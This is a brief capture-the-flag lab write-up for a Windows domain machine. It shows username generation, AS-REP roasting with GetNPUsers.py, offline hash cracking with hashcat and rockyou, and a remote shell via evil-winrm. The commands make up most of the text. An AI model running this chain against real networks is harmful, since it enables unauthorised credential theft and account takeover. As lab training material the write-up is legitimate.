Usernames

In the page http://10.10.10.175/about.html there is a list of the employees and using a tool like Username-anarchy it is possible to get common usernames from full names!

while read user; do

GetNPUsers.py -dc-ip 10.10.10.175 -no-pass -request egotistical-bank.local/"$user" >> hashes.txt

done < users.txt

users.txt is the usernames generated from username-anarchy and it will output the hashes for the users if their is no password set for the user to login into active directory with. And there should be a valid hash!

Foothold

to crack the hash: hashcat ./hashes.txt -a 0 /usr/share/wordlists/rockyou.txt Then use evil-winrm to get a shell!

evil-winrm -u "fsmith" -i 10.10.10.175

And there is user!
